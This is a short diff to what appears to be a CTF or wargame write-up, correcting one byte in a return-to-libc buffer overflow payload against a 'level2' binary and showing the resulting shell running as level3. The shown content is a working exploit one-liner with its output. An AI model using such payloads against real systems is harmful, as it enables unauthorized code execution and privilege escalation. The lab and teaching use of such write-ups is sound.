@@ -81,7 +81,7 @@ Now, it's time for the exploit :D<br>
 `[ OFFSET ] [ RETURN ADDRESS ] [ SYSTEM ADDRESS ] [ EXIT ADDRESS ] [ ARGS ADDRESS ]`
 
 ```sh
-$ (python -c 'print("A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x1d\xf9\xff\bf")'; cat) | ./level2
+$ (python -c 'print("A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x1d\xf9\xff\xbf")'; cat) | ./level2
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAK`�����X���
 whoami
 level3
